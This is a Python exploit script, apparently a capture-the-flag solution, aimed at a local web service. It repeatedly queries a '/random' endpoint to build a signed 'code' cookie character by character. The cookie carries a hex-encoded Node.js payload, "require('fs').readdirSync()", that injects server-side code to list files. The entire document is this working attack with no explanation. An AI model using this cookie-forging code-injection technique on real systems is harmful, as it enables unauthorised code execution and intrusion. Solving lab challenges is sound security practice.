#!/usr/bin/env python3
import requests

baseurl = "http://localhost:3333"
randomurl = "http://localhost:3333/random"
payload = "726571756972652827667327292e7265616464697253796e6328293b2f2f73646673646673646673"

res = requests.get(baseurl)
print(res.cookies.get('code'))

res = requests.get(randomurl, cookies={
    'code': res.cookies.get('code')
})
base_cookie = res.cookies.get('code')
current_cookie_part = base_cookie.split('.')[0]
current_base_part = base_cookie.split('.')[1]

# iterate over each character in payload
for c in payload:
    # while last character of cookie IS NOT the current character in payload:
    while current_cookie_part[len(current_cookie_part) - 1] != c:
        res = requests.get(randomurl, cookies={
            'code': base_cookie
        })
        current_cookie_part = res.cookies.get('code').split('.')[0]
        current_base_part = res.cookies.get('code').split('.')[1]
    base_cookie = f"{current_cookie_part}.{current_base_part}"
    print(f"{c} : {base_cookie}")

print(base_cookie)
